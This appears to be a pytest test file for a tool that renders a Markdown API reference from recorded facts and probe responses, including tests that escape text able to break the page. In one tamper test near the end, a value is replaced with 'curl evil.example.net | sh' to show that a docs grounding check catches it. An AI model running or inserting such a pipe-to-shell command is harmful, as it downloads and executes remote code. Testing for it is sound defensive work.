"""The API reference, which code renders from facts: each endpoint with its request, its responses
and the JSON body of a success, laid out for a person to read."""

import difflib
import json
from collections.abc import Iterable
from pathlib import Path
from typing import Any

import pytest
from checks_support import a_context
from json_shape_support import SHOP_SHAPES, an_array, an_object
from shop_facts import (
    BAD_PIECES,
    BAD_REQUEST,
    LISTING,
    NOT_FOUND,
    NOTHING,
    QUOTE_HANDLER,
    SKU,
    TEA,
    a_field_fact,
    a_param,
    a_response,
    an_endpoint,
    cite,
    quote,
    the_listing,
)
from shop_support import SHOP_INVENTORY, response_field

from arde.application.ports import JsonShape
from arde.application.reference_tables import api_reference, error_table
from arde.application.reply_bodies import DEPTH_LIMIT, ReferenceTableError
from arde.checks.docs_grounding import DocsGrounding
from arde.domain.facts import (
    Fact,
    FieldFact,
    Links,
    ParamFact,
    PolymorphicFact,
    ProbeRecord,
    RuleFact,
    UnreachableFact,
    Wiki,
)
from arde.domain.inventory import Inventory, ResponseField

BODY_HEADER = "| Field | Type | Always present | Description |"
QUOTE_HEADING = "### `GET /items/{sku}`"
LISTING_HEADING = "### `GET /`"
PROBES = (TEA, NOTHING, BAD_PIECES, LISTING)
QUOTE = an_endpoint(
    evidence=(QUOTE_HANDLER, cite(TEA), cite(NOTHING), cite(BAD_PIECES)),
    responses=(a_response(), NOT_FOUND, BAD_REQUEST),
)
LISTED = the_listing()
TRAITS = PolymorphicFact(
    id="polymorphic.quote.traits",
    topic="api",
    kind="polymorphic",
    evidence=(quote('Traits      any    `json:"traits"`', file="web/payloads.go"),),
    links=Links(declarations=("web/payloads.go::type Quote",)),
    struct="Quote",
    field="Traits",
    variants=("LeafTraits", "web.CupTraits"),
)


def about(field: ResponseField) -> str:
    return f"About {field.struct}.{field.name}"


# Each description names its field, so a test can count where the field appears.
def described(fields: Iterable[ResponseField]) -> tuple[FieldFact, ...]:
    return tuple(
        a_field_fact(
            id=f"field.{field.struct}.{field.name}",
            links=Links(declarations=(f"{field.file}::type {field.struct}",)),
            struct=field.struct,
            field=field.name,
            description=about(field),
        )
        for field in fields
    )


SHOP_FACTS: tuple[Fact, ...] = (QUOTE, LISTED, TRAITS, *described(SHOP_INVENTORY.response_fields))


def page(
    facts: tuple[Fact, ...] = SHOP_FACTS,
    *,
    inventory: Inventory = SHOP_INVENTORY,
    probes: tuple[ProbeRecord, ...] = PROBES,
    shapes: dict[str, JsonShape] = SHOP_SHAPES,
) -> str:
    wiki = Wiki(facts=facts, probes=probes)
    return api_reference(wiki, inventory, json_shape=shapes.__getitem__)


def with_fields(*fields: ResponseField, inventory: Inventory = SHOP_INVENTORY) -> Inventory:
    every = sorted(
        (*inventory.response_fields, *fields), key=lambda field: (field.struct, field.name)
    )
    return inventory.model_copy(update={"response_fields": tuple(every)})


# The shop's page with more fields in its inventory, each described by a fact.
def page_with_fields(
    *fields: ResponseField,
    shapes: dict[str, JsonShape] = SHOP_SHAPES,
    facts: tuple[Fact, ...] = SHOP_FACTS,
) -> str:
    return page((*facts, *described(fields)), inventory=with_fields(*fields), shapes=shapes)


def with_fact(changed: Fact, facts: tuple[Fact, ...] = SHOP_FACTS) -> tuple[Fact, ...]:
    return tuple(changed if fact.id == changed.id else fact for fact in facts)


def section(text: str, heading: str) -> str:
    """The heading's lines, up to the next heading of its level or a higher one."""
    lines = text.splitlines()
    start = lines.index(heading)
    level = heading_level(heading)
    after = range(start + 1, len(lines))
    end = next((i for i in after if 0 < heading_level(lines[i]) <= level), len(lines))
    return "\n".join(lines[start:end])


def heading_level(line: str) -> int:
    marks = len(line) - len(line.lstrip("#"))
    return marks if marks and line[marks:].startswith(" ") else 0


def rows_of(text: str) -> list[str]:
    return [line for line in text.splitlines() if line.startswith("| ") and "---" not in line]


def json_block(text: str) -> str:
    lines = text.splitlines()
    start = lines.index("```json")
    return "\n".join(lines[start + 1 : lines.index("```", start)])


def changed_lines(before: str, after: str) -> list[str]:
    return [
        line
        for line in difflib.ndiff(before.splitlines(), after.splitlines())
        if line.startswith(("+ ", "- "))
    ]


# The endpoint


def test_an_endpoint_is_headed_by_its_method_and_path_with_its_summary_below() -> None:
    endpoint = section(page(), QUOTE_HEADING)

    assert endpoint.splitlines()[:3] == [QUOTE_HEADING, "", "Price some pieces of one item"]


def test_endpoints_are_listed_by_path_whatever_the_wiki_order() -> None:
    reference = page((LISTED, QUOTE, TRAITS, *described(SHOP_INVENTORY.response_fields)))

    assert reference.index(LISTING_HEADING) < reference.index(QUOTE_HEADING)


# Text from a model on a line of its own could open a block that swallows or hides the page.
@pytest.mark.parametrize(
    ("summary", "shown"),
    [
        ("```", "\\```"),
        ("~~~ all of it", "\\~~~ all of it"),
        ("# Prices", "\\# Prices"),
        ("- pieces", "\\- pieces"),
        ("1. pieces", "1\\. pieces"),
        ("> quoted", "\\> quoted"),
        ("[x]: https://example.com/x", "\\[x]: https://example.com/x"),
        ("  Price it", "Price it"),
        ("2024 prices", "2024 prices"),
    ],
)
def test_a_summary_stays_one_plain_paragraph(summary: str, shown: str) -> None:
    reference = page(with_fact(QUOTE.model_copy(update={"summary": summary})))

    assert section(reference, QUOTE_HEADING).splitlines()[2] == shown


def test_fact_text_cannot_open_an_html_comment_or_tag() -> None:
    hidden = QUOTE.model_copy(update={"summary": "Price it <!-- the rest is hidden"})

    reference = page(with_fact(hidden))

    assert "\n\nPrice it \\<!-- the rest is hidden\n\n" in reference
    assert "<!--" not in reference.replace("\\<!--", "")


# The request


def test_an_endpoint_with_no_params_says_so_in_one_line() -> None:
    listing = section(page(), LISTING_HEADING)

    assert "\n\nNo parameters.\n\n" in listing
    assert "#### Request" not in listing


def test_the_request_lists_each_param_with_its_json_type_and_rules() -> None:
    request = section(section(page(), QUOTE_HEADING), "#### Request")

    assert rows_of(request) == [
        "| Parameter | In | Type | Required | Rules | Description |",
        "| `sku` | path | string | yes |  | The item to price |",
        "| `pieces` | query | integer | no | 1 to 50; default `1` | How many pieces to price |",
    ]


@pytest.mark.parametrize(
    ("limits", "rules"),
    [
        ({"minimum": 1, "maximum": 50}, "1 to 50"),
        ({"minimum": 1, "maximum": None}, "at least 1"),
        ({"minimum": None, "maximum": 50}, "at most 50"),
        ({"minimum": None, "maximum": None}, ""),
    ],
)
def test_the_limits_read_as_a_range_or_a_bound(limits: dict[str, Any], rules: str) -> None:
    bounded = a_param(**limits, default=None)

    reference = page(with_fact(QUOTE.model_copy(update={"params": (bounded,)})))

    assert f"| `pieces` | query | integer | no | {rules} | How many pieces to price |" in reference


def test_rules_join_the_limits_the_choices_and_the_default_in_that_order() -> None:
    chosen = a_param(enum=("1", "5", "10"), default="5")

    reference = page(with_fact(QUOTE.model_copy(update={"params": (chosen,)})))

    assert "| 1 to 50; one of `1`, `5`, `10`; default `5` |" in reference


@pytest.mark.parametrize(
    ("declared", "shown"), [("int", "integer"), ("bool", "boolean"), ("number", "number")]
)
def test_a_param_shows_its_json_type(declared: str, shown: str) -> None:
    typed = a_param(declared_type=declared)

    reference = page(with_fact(QUOTE.model_copy(update={"params": (typed,)})))

    assert f"| `pieces` | query | {shown} | no |" in reference


# Another task may add locations and types to ParamFact, and the page must not need to know them.
def test_a_location_or_type_the_page_has_never_seen_prints_as_written() -> None:
    unseen = ParamFact.model_construct(
        **{**a_param().model_dump(), "location": "cookie", "declared_type": "date"}
    )

    reference = page(with_fact(QUOTE.model_copy(update={"params": (unseen,)})))

    assert "| `pieces` | cookie | date | no |" in reference


def test_a_new_param_changes_one_row_only() -> None:
    color = a_param(name="color", declared_type="string", description="The color", default=None)
    wider = QUOTE.model_copy(update={"params": (SKU, a_param(), color)})

    changed = changed_lines(page(), page(with_fact(wider)))

    assert changed == ["+ | `color` | query | string | no | 1 to 50 | The color |"]


def test_text_that_would_split_a_cell_is_escaped() -> None:
    piped = a_param(description="Pieces | boxes, as a\\ number")

    reference = page(with_fact(QUOTE.model_copy(update={"params": (piped,)})))

    assert "| Pieces \\| boxes, as a\\\\ number |" in reference


def test_a_value_holding_a_backtick_stays_one_code_span() -> None:
    odd = a_param(enum=("a`b",), default="`x")

    reference = page(with_fact(QUOTE.model_copy(update={"params": (odd,)})))

    assert "| 1 to 50; one of ``a`b``; default `` `x `` |" in reference


# The responses


def test_each_response_is_a_row_with_when_and_its_error_codes() -> None:
    responses = section(section(page(), QUOTE_HEADING), "#### Responses")

    assert rows_of(responses) == [
        "| Status | When | Error codes |",
        "| 200 | The price of the pieces |  |",
        "| 404 | No item | `unknown_sku` |",
        "| 400 | The price of the pieces | `bad_pieces` |",
    ]


# The success body


def quote_body(reference: str) -> str:
    return section(section(reference, QUOTE_HEADING), "#### `200` response body")


def test_a_success_body_lists_each_field_by_its_path_and_json_type() -> None:
    assert rows_of(quote_body(page()))[:7] == [
        BODY_HEADER,
        "| `charge_cents` | integer | yes | About Quote.ChargeCents |",
        "| `details` | `any` | yes | About Quote.Details |",
        "| `note` | string | no | About Quote.Note |",
        "| `pieces` | integer | yes | About Quote.Pieces |",
        "| `sku` | string | yes | About Quote.SKU |",
        "| `traits` | object, one of 2 shapes | yes | About Quote.Traits |",
    ]


def test_an_array_has_its_row_then_its_items_fields_under_brackets() -> None:
    body = section(section(page(), LISTING_HEADING), "#### `200` response body")

    assert rows_of(body) == [
        BODY_HEADER,
        "| `items` | array of objects | yes | About Listing.Items |",
        "| `items[].price_cents` | integer | yes | About ItemView.PriceCents |",
        "| `items[].sku` | string | yes | About ItemView.SKU |",
        "| `items[].title` | string | yes | About ItemView.Title |",
    ]


TOTAL = response_field("Quote", "Total", json_name="total", declared_type="Money")
CENTS = response_field("Money", "Cents", json_name="cents", declared_type="int64")
SHAPES_WITH_MONEY = {**SHOP_SHAPES, "Money": an_object("Money")}


def test_a_nested_objects_fields_follow_it_as_dotted_paths() -> None:
    reference = page_with_fields(TOTAL, CENTS, shapes=SHAPES_WITH_MONEY)

    rows = rows_of(quote_body(reference))
    total = rows.index("| `total` | object | yes | About Quote.Total |")
    assert rows[total + 1] == "| `total.cents` | integer | yes | About Money.Cents |"


def test_a_polymorphic_field_is_one_row_then_one_table_per_shape() -> None:
    body = quote_body(page())

    assert rows_of(section(body, "##### `traits` as `LeafTraits`")) == [
        BODY_HEADER,
        "| `traits.grams` | integer | yes | About LeafTraits.Grams |",
    ]
    assert rows_of(section(body, "##### `traits` as `CupTraits`")) == [
        BODY_HEADER,
        "| `traits.millilitres` | integer | yes | About CupTraits.Millilitres |",
    ]


def test_a_type_no_struct_of_the_inventory_has_is_shown_by_name_and_not_expanded() -> None:
    rate = response_field("Quote", "Rate", json_name="rate", declared_type="pricing.Rate")
    shapes = {**SHOP_SHAPES, "pricing.Rate": an_object("Rate", "pricing")}

    reference = page_with_fields(rate, shapes=shapes)

    rows = rows_of(quote_body(reference))
    assert "| `rate` | `pricing.Rate` | yes | About Quote.Rate |" in rows
    assert not [row for row in rows if row.startswith("| `rate.")]


def test_a_type_that_holds_itself_is_expanded_once() -> None:
    related = response_field("Quote", "Related", json_name="related", declared_type="*Quote")
    hop = response_field("Quote", "Next", json_name="next", declared_type="Hop")
    back = response_field("Hop", "Back", json_name="back", declared_type="*Quote")
    shapes = {**SHOP_SHAPES, "*Quote": an_object("Quote"), "Hop": an_object("Hop")}

    reference = page_with_fields(related, hop, back, shapes=shapes)

    rows = rows_of(quote_body(reference))
    assert "| `related` | `*Quote` | yes | About Quote.Related |" in rows
    assert "| `next` | object | yes | About Quote.Next |" in rows
    assert "| `next.back` | `*Quote` | yes | About Hop.Back |" in rows
    assert not [row for row in rows if row.startswith(("| `related.", "| `next.back."))]


def test_nesting_stops_at_the_depth_limit() -> None:
    links = [
        response_field(f"Link{n}", "Next", json_name="next", declared_type=f"Link{n + 1}")
        for n in range(DEPTH_LIMIT + 2)
    ]
    chain = response_field("Quote", "Chain", json_name="chain", declared_type="Link0")
    shapes = {**SHOP_SHAPES, **{f"Link{n}": an_object(f"Link{n}") for n in range(DEPTH_LIMIT + 3)}}

    reference = page(inventory=with_fields(chain, *links), shapes=shapes)

    chained = [row for row in rows_of(quote_body(reference)) if row.startswith("| `chain")]
    # The reply is the first level, so the chain gives the levels after it.
    assert [row.split(" | ")[1] for row in chained] == [
        *(["object"] * (DEPTH_LIMIT - 1)),
        f"`Link{DEPTH_LIMIT - 1}`",
    ]


def test_an_array_names_what_each_item_is() -> None:
    tags = response_field("Quote", "Tags", json_name="tags", declared_type="[]string")
    grid = response_field("Quote", "Grid", json_name="grid", declared_type="[][]int")
    codes = response_field("Quote", "Codes", json_name="codes", declared_type="[]pricing.Code")
    shapes = {
        **SHOP_SHAPES,
        "[]string": an_array("string"),
        "[][]int": an_array("[]int"),
        "[]int": an_array("int"),
        "[]pricing.Code": an_array("pricing.Code"),
        "pricing.Code": an_object("Code", "pricing"),
    }

    rows = rows_of(quote_body(page_with_fields(tags, grid, codes, shapes=shapes)))

    assert "| `tags` | array of strings | yes | About Quote.Tags |" in rows
    assert "| `grid` | array of arrays of integers | yes | About Quote.Grid |" in rows
    assert "| `codes` | array of `pricing.Code` | yes | About Quote.Codes |" in rows


def test_the_values_of_an_object_whose_keys_are_data_are_named_with_a_star() -> None:
    prices = response_field("Quote", "Prices", json_name="prices", declared_type="map[string]Money")
    shapes = {**SHAPES_WITH_MONEY, "map[string]Money": JsonShape(kind="object", element="Money")}

    rows = rows_of(quote_body(page_with_fields(prices, CENTS, shapes=shapes)))

    at = rows.index("| `prices` | object of objects | yes | About Quote.Prices |")
    assert rows[at + 1] == "| `prices.*.cents` | integer | yes | About Money.Cents |"


def test_a_body_that_is_no_object_names_its_type_before_its_fields() -> None:
    items = a_response(declared_type="[]web.ItemView", description="The items")
    listing = LISTED.model_copy(update={"responses": (items,)})
    shapes = {
        **SHOP_SHAPES,
        "[]web.ItemView": an_array("web.ItemView"),
        "web.ItemView": an_object("ItemView", "web"),
    }

    reference = page(with_fact(listing), shapes=shapes)

    body = section(section(reference, LISTING_HEADING), "#### `200` response body")
    assert body.splitlines()[2] == "Type of the body: array of objects."
    assert rows_of(body) == [
        BODY_HEADER,
        "| `[].price_cents` | integer | yes | About ItemView.PriceCents |",
        "| `[].sku` | string | yes | About ItemView.SKU |",
        "| `[].title` | string | yes | About ItemView.Title |",
    ]


BARE_QUOTE = QUOTE.model_copy(
    update={"responses": (a_response(declared_type="Quote"), NOT_FOUND, BAD_REQUEST)}
)
SHAPES_WITH_BARE_QUOTE = {**SHOP_SHAPES, "Quote": an_object("Quote")}


def test_a_bare_response_type_names_a_struct_of_the_handlers_package() -> None:
    reference = page(with_fact(BARE_QUOTE), shapes=SHAPES_WITH_BARE_QUOTE)

    assert "| `charge_cents` | integer | yes | About Quote.ChargeCents |" in quote_body(reference)


def test_a_bare_response_type_of_a_route_with_no_handler_function_is_shown_by_name() -> None:
    routes = tuple(
        route.model_copy(update={"handler_id": None, "handler_file": None, "handler_line": None})
        for route in SHOP_INVENTORY.routes
    )
    inventory = SHOP_INVENTORY.model_copy(update={"routes": routes})

    reference = page(with_fact(BARE_QUOTE), inventory=inventory, shapes=SHAPES_WITH_BARE_QUOTE)

    assert quote_body(reference).splitlines()[2] == "Type of the body: `Quote`."


def test_a_shape_no_struct_of_the_inventory_has_is_named_and_not_expanded() -> None:
    bowl = TRAITS.model_copy(update={"variants": ("LeafTraits", "pricing.Bowl")})
    shapes = {**SHOP_SHAPES, "pricing.Bowl": an_object("Bowl", "pricing")}

    body = quote_body(page(with_fact(bowl), shapes=shapes))

    shape = section(body, "##### `traits` as `pricing.Bowl`")
    assert shape.splitlines()[2:] == ["Its fields are not shown here."]


def kinds_leaf(name: str, json_name: str) -> ResponseField:
    leaf = response_field("LeafTraits", name, json_name=json_name, declared_type="int")
    return leaf.model_copy(update={"file": "kinds/kinds.go", "package": "kinds"})


# A variant is a name a fact wrote, and its struct may be declared in another package than the
# field that holds it, as long as only one struct has that name.
def test_a_bare_shape_names_the_one_struct_of_its_name_in_any_package() -> None:
    elsewhere = tuple(
        kinds_leaf(field.name, field.json_name) if field.struct == "LeafTraits" else field
        for field in SHOP_INVENTORY.response_fields
    )
    inventory = SHOP_INVENTORY.model_copy(update={"response_fields": elsewhere})

    body = quote_body(page(inventory=inventory))

    assert rows_of(section(body, "##### `traits` as `LeafTraits`"))[1:] == [
        "| `traits.grams` | integer | yes | About LeafTraits.Grams |"
    ]


def test_a_bare_shape_names_the_holders_struct_before_one_of_another_package() -> None:
    ounces = kinds_leaf("Ounces", "ounces")

    body = quote_body(page_with_fields(ounces))

    assert rows_of(section(body, "##### `traits` as `LeafTraits`"))[1:] == [
        "| `traits.grams` | integer | yes | About LeafTraits.Grams |"
    ]


# The example


def quote_example(reference: str) -> str:
    return section(section(reference, QUOTE_HEADING), "#### Example `200` response")


def test_the_example_is_the_recorded_body_pretty_printed() -> None:
    example = json_block(quote_example(page()))

    assert example == json.dumps(json.loads(TEA.body), indent=2)
    assert json.loads(example) == json.loads(TEA.body)


def a_listing_of(count: int) -> ProbeRecord:
    items = [{"sku": f"sku-{n}", "title": f"Item {n}", "price_cents": n} for n in range(count)]
    return LISTING.model_copy(update={"body": json.dumps({"items": items})})


def listing_example(probe: ProbeRecord) -> str:
    reference = page(probes=(TEA, NOTHING, BAD_PIECES, probe))
    return section(section(reference, LISTING_HEADING), "#### Example `200` response")


# Each item prints on five lines, so seven come to 38 lines with the object around them.
def test_an_example_of_forty_lines_or_fewer_keeps_every_item() -> None:
    probe = a_listing_of(7)

    example = listing_example(probe)

    assert json.loads(json_block(example)) == json.loads(probe.body)
    assert "Arrays are cut" not in example


def test_a_longer_example_keeps_the_first_two_items_of_each_array() -> None:
    probe = a_listing_of(8)

    example = listing_example(probe)

    recorded = json.loads(probe.body)
    assert json.loads(json_block(example)) == {"items": recorded["items"][:2]}
    assert example.endswith("```\n\nArrays are cut to their first 2 items.")


# Values print exactly as recorded, however Python would round them or merge their keys.
def test_an_example_keeps_every_number_as_written_and_every_key() -> None:
    body = '{"a":0.1000000000000000055511151231257827,"b":1e2,"b":-0,"c":12345678901234567890}'
    probe = TEA.model_copy(update={"body": body})

    example = json_block(quote_example(page(probes=(probe, NOTHING, BAD_PIECES, LISTING))))

    assert example.splitlines() == [
        "{",
        '  "a": 0.1000000000000000055511151231257827,',
        '  "b": 1e2,',
        '  "b": -0,',
        '  "c": 12345678901234567890',
        "}",
    ]


# A reply's text could open an HTML tag the docs checks refuse, reorder what a reader sees, or
# hold half of a character, which no page can be written with.
def test_an_example_writes_text_that_could_break_the_page_as_escapes() -> None:
    body = json.dumps({"note": "<code>x</code> & ‮evil \ud800 \U000e0001"})
    probe = TEA.model_copy(update={"body": body})

    example = json_block(quote_example(page(probes=(probe, NOTHING, BAD_PIECES, LISTING))))

    assert example.splitlines()[1] == (
        '  "note": "\\u003ccode\\u003ex\\u003c/code\\u003e \\u0026 \\u202eevil \\ud800 '
        '\\udb40\\udc01"'
    )
    assert json.loads(example) == json.loads(body)


def test_no_example_is_shown_without_a_recorded_success_of_the_endpoint() -> None:
    elsewhere = LISTED.model_copy(update={"evidence": (cite(TEA),)})

    reference = page(with_fact(elsewhere), probes=(TEA, NOTHING, BAD_PIECES))

    assert "Example" not in section(reference, LISTING_HEADING)
    assert "```" not in section(reference, LISTING_HEADING)


@pytest.mark.parametrize("body", ["", "Items: none", "[1, NaN]", '"just text"'])
def test_no_example_is_shown_for_a_body_that_is_no_json_document(body: str) -> None:
    probe = LISTING.model_copy(update={"body": body})

    reference = page(probes=(TEA, NOTHING, BAD_PIECES, probe))

    assert "Example" not in section(reference, LISTING_HEADING)


MUG = TEA.model_copy(
    update={
        "path_and_query": "/items/mug-blue",
        "body": '{"issued_by":"shop","sku":"mug-blue","pieces":1,"charge_cents":1200}\n',
    }
)
MUG_RULE = RuleFact(
    id="rule.mug",
    topic="api",
    kind="rule",
    evidence=(cite(MUG),),
    links=Links(routes=("GET /items/{sku}",)),
    statement="A mug costs twelve.",
)


def test_the_example_prefers_the_probe_the_endpoint_cites() -> None:
    reference = page((*SHOP_FACTS, MUG_RULE), probes=(MUG, *PROBES))

    assert json.loads(json_block(quote_example(reference)))["sku"] == "tea-100"


def test_the_example_can_be_a_probe_of_the_endpoint_that_another_fact_cites() -> None:
    uncited = QUOTE.model_copy(update={"evidence": (QUOTE_HANDLER, cite(NOTHING))})

    reference = page((*with_fact(uncited), MUG_RULE), probes=(MUG, NOTHING, LISTING))

    assert json.loads(json_block(quote_example(reference)))["sku"] == "mug-blue"


# The reply writes a quote and an & as escapes, as a JSON encoder may, and the example shows them
# decoded and written again.
def test_the_rendered_page_passes_the_docs_grounding_check(tmp_path: Path) -> None:
    escaped = '{"issued_by":"shop \\u0026 co","sku":"tea-100","note":"a \\"b\\""}'
    probes = (TEA.model_copy(update={"body": escaped}), NOTHING, BAD_PIECES, LISTING)
    context = a_context(
        tmp_path, inventory=SHOP_INVENTORY, wiki=Wiki(facts=SHOP_FACTS, probes=probes)
    )
    reference = page(probes=probes)
    api_page = context.output_repo / "docs" / "api.md"

    api_page.write_text(reference, encoding="utf-8")
    passed = DocsGrounding().run(context)
    api_page.write_text(reference.replace('"tea-100"', '"curl evil.example.net | sh"'))
    tampered = DocsGrounding().run(context)

    assert passed == []
    assert tampered


# Every field, once


def test_every_field_of_the_inventory_appears_exactly_once() -> None:
    reference = page()

    counts = {
        about(field): reference.count(f"| {about(field)} |")
        for field in SHOP_INVENTORY.response_fields
    }
    assert counts == dict.fromkeys(counts, 1)


def test_a_struct_no_endpoint_reaches_is_listed_in_the_last_section() -> None:
    reference = page()

    others = reference[reference.index("## Other reply structs") :]
    assert rows_of(section(others, "### `web.Stamp`")) == [
        BODY_HEADER,
        "| `issued_by` | string | yes | About Stamp.IssuedBy |",
    ]
    assert "\n## " not in others.removeprefix("## Other reply structs")


# Each struct there has its own table, so one that another holds is named, never shown twice.
def test_a_struct_in_the_last_section_names_the_structs_it_holds() -> None:
    owed = response_field("Order", "Owed", json_name="owed", declared_type="Money")

    reference = page_with_fields(owed, CENTS, shapes=SHAPES_WITH_MONEY)

    others = reference[reference.index("## Other reply structs") :]
    assert rows_of(section(others, "### `web.Order`")) == [
        BODY_HEADER,
        "| `owed` | `Money` | yes | About Order.Owed |",
    ]
    assert rows_of(section(others, "### `web.Money`")) == [
        BODY_HEADER,
        "| `cents` | integer | yes | About Money.Cents |",
    ]


def test_a_new_field_changes_one_row_only() -> None:
    discount = response_field("Quote", "Discount", json_name="discount", declared_type="int")
    before = page()

    after = page_with_fields(discount)

    assert changed_lines(before, after) == [
        "+ | `discount` | integer | yes | About Quote.Discount |"
    ]


def test_two_structs_of_one_name_are_told_apart_by_the_facts_link() -> None:
    legacy = ResponseField(
        struct="Quote",
        name="ChargeCents",
        json_name="total_cents",
        declared_type="int64",
        may_be_absent=False,
        file="legacy/payloads.go",
        package="legacy",
    )
    linked = a_field_fact(
        id="field.legacy.quote.charge",
        links=Links(declarations=("legacy/payloads.go::type Quote",)),
        struct="Quote",
        field="ChargeCents",
        description="What the pieces cost",
    )
    facts = tuple(fact for fact in SHOP_FACTS if fact.id != "field.Quote.ChargeCents")

    reference = page((*facts, linked), inventory=with_fields(legacy))

    assert "| `total_cents` | integer | yes | What the pieces cost |" in reference
    assert "| `charge_cents` | integer | yes |  |" in reference


def test_a_field_the_inventory_does_not_hold_stops_with_its_name() -> None:
    invented = a_field_fact(id="field.discount", field="Discount", description="A discount")

    with pytest.raises(ReferenceTableError) as stopped:
        page((*SHOP_FACTS, invented))

    assert "Quote.Discount" in str(stopped.value)
    assert stopped.value.next_action


# The error replies


def test_the_error_body_is_shown_once_after_the_endpoints() -> None:
    listing = LISTED.model_copy(update={"responses": (*LISTED.responses, NOT_FOUND)})

    reference = page(with_fact(listing))

    replies = section(reference, "## Error replies")
    assert reference.count("About problem.Code") == 1
    assert "The 400 and 404 responses above reply with `web.problem`:" in replies
    assert rows_of(section(replies, "## Error replies"))[:2] == [
        BODY_HEADER,
        "| `code` | string | yes | About problem.Code |",
    ]


def test_the_reference_holds_the_error_table_after_the_error_body() -> None:
    reference = page()

    replies = section(reference, "## Error replies")
    assert replies.index("About problem.Code") < replies.index(
        error_table(Wiki(facts=SHOP_FACTS, probes=PROBES))
    )


def test_error_table_marks_unreachable_codes() -> None:
    unreachable = UnreachableFact(
        id="unreachable.internal",
        topic="errors",
        evidence=(QUOTE_HANDLER,),
        links=Links(files=("web/failures.go",)),
        kind="unreachable",
        error_code="internal",
        reason="Every handler checks its input\nbefore it reads the store.",
    )

    table = error_table(Wiki(facts=(QUOTE, unreachable), probes=PROBES))

    assert rows_of(table) == [
        "| Code | Status | Returned by | Note |",
        "| `bad_pieces` | 400 | `GET /items/{sku}` |  |",
        "| `internal` |  |  | Never returned: Every handler checks its input before it reads the "
        "store. |",
        "| `unknown_sku` | 404 | `GET /items/{sku}` |  |",
    ]


def test_a_code_several_routes_return_is_one_row_naming_them_all() -> None:
    listing = LISTED.model_copy(update={"responses": (*LISTED.responses, NOT_FOUND)})

    table = error_table(Wiki(facts=(QUOTE, listing), probes=PROBES))

    assert "| `unknown_sku` | 404 | `GET /`, `GET /items/{sku}` |  |" in rows_of(table)


# Notes


def test_a_rule_on_the_api_topic_is_kept_in_the_notes() -> None:
    rule = RuleFact(
        id="rule.case",
        topic="api",
        evidence=(QUOTE_HANDLER,),
        links=Links(routes=("GET /items/{sku}",)),
        kind="rule",
        statement="The sku is matched\nwhatever its case.",
    )

    reference = page((*SHOP_FACTS, rule))

    assert "## Notes\n\n- The sku is matched whatever its case." in reference
